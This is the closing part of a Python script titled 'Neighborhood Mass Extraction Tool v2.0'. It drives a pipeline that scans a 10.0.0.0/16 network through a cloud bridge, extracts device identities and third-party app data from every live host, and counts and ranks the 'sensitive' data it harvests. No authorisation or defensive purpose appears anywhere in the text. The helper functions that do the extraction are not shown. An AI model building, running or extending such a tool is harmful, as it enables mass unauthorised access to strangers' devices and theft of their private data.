                print(f"  Status: {device.get('status')} — {device.get('error', '')[:100]}")
        except Exception as e:
            print(f"  ERROR: {e}")
            results.append({"ip": ip, "status": "error", "error": str(e)[:200]})

    elapsed = time.time() - start
    alive_r = [r for r in results if r.get("status") == "alive"]
    print(f"\n{'='*70}")
    print(f"TEST DONE — {elapsed:.0f}s — {len(alive_r)}/{len(results)} alive — {bridge.api_calls} API calls")
    print(f"{'='*70}")

    with open(EXTRACTION_DIR / "test_results.json", "w") as f:
        json.dump({"test_date": datetime.now().isoformat(), "elapsed_sec": elapsed,
                    "api_calls": bridge.api_calls, "devices": results}, f, indent=2)
    return results


# ═══════════════════════════════════════════════════════════════════════
# SINGLE DEVICE EXTRACTION
# ═══════════════════════════════════════════════════════════════════════

async def extract_single(ip: str):
    """Full extraction of a single device."""
    bridge = CloudBridge()
    EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
    print(f"\nExtracting {ip}...")
    device = await extract_device(bridge, ip)
    if device.get("status") != "alive":
        print(f"  ✗ {device.get('status')} — {device.get('error', '')[:100]}")
        return
    ident = device.get("identity", {})
    model = ident.get("model", "unknown")
    print(f"  ✓ {model} — {device.get('all_package_count',0)} pkgs — ★{device.get('score',0)}")
    safe_ip = ip.replace(".", "_")
    safe_model = re.sub(r'[^\w\-]', '_', model)[:30]
    device_dir = EXTRACTION_DIR / "devices" / f"{safe_ip}_{safe_model}"
    device_dir.mkdir(parents=True, exist_ok=True)
    with open(device_dir / "identity.json", "w") as f:
        json.dump(device, f, indent=2)
    packages = device.get("third_party", [])
    print(f"  Extracting {len(packages)} 3rd-party apps...")
    for i, pkg in enumerate(packages):
        try:
            result = await extract_app_data(bridge, ip, pkg, device_dir)
            if result.get("status") == "extracted":
                n_sens = len(result.get("sensitive_data", []))
                if n_sens > 0:
                    print(f"    [{i+1}/{len(packages)}] ✓ {pkg}: {n_sens} sensitive")
        except Exception:
            pass
    print(f"  ✓ Done → {device_dir}")


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    args = sys.argv[1:]
    if not args or args[0] == "full":
        await run_full()
    elif args[0] == "scan":
        bridge = CloudBridge()
        EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
        await phase1_scan(bridge, force_rescan="--force" in args)
    elif args[0] == "extract":
        bridge = CloudBridge()
        EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
        if HOSTS_FILE.exists():
            with open(HOSTS_FILE) as f:
                hosts = [l.strip() for l in f if l.strip()]
        elif SCAN_RESULTS_FILE.exists():
            with open(SCAN_RESULTS_FILE) as f:
                hosts = json.load(f).get("hosts", [])
        else:
            print("No scan data. Run 'scan' first.")
            return
        devices = await phase2_extract(bridge, hosts)
        phase4_analyze(devices)
    elif args[0] == "analyze":
        progress_file = EXTRACTION_DIR / "identity_progress.json"
        if not progress_file.exists():
            # Try harvest_scan data
            if HARVEST_SCAN.exists():
                with open(HARVEST_SCAN) as f:
                    devices = json.load(f)
                phase4_analyze(devices)
            else:
                print("No extraction data.")
            return
        with open(progress_file) as f:
            devices = json.load(f).get("devices", [])
        phase4_analyze(devices)
    elif args[0] == "test":
        n = int(args[1]) if len(args) > 1 else 10
        await test_mode(n)
    elif args[0] == "extract-one" and len(args) > 1:
        await extract_single(args[1])
    else:
        print("Usage:")
        print("  python3 tools/neighborhood_extractor.py              # Full pipeline")
        print("  python3 tools/neighborhood_extractor.py scan         # Scan only")
        print("  python3 tools/neighborhood_extractor.py extract      # Extract all")
        print("  python3 tools/neighborhood_extractor.py analyze      # Analyze")
        print("  python3 tools/neighborhood_extractor.py test [N]     # Test on N hosts")
        print("  python3 tools/neighborhood_extractor.py extract-one <IP>  # Single")


async def run_full():
    print("╔" + "═" * 68 + "╗")
    print("║  NEIGHBORHOOD MASS EXTRACTION TOOL v2.0                          ║")
    print("║  Target: 10.0.0.0/16 via AC32010810392                           ║")
    print("╚" + "═" * 68 + "╝")
    EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
    bridge = CloudBridge()
    t0 = time.time()
    hosts = await phase1_scan(bridge)
    if not hosts:
        print("\n✗ No hosts found.")
        return
    devices = await phase2_extract(bridge, hosts)
    await phase3_deep_extract(bridge, devices, top_n=50)
    phase4_analyze(devices)
    print(f"\n{'='*70}")
    print(f"DONE — {(time.time()-t0)/60:.1f}min — {bridge.api_calls} API calls — Output: {EXTRACTION_DIR}")


if __name__ == "__main__":
    asyncio.run(main())
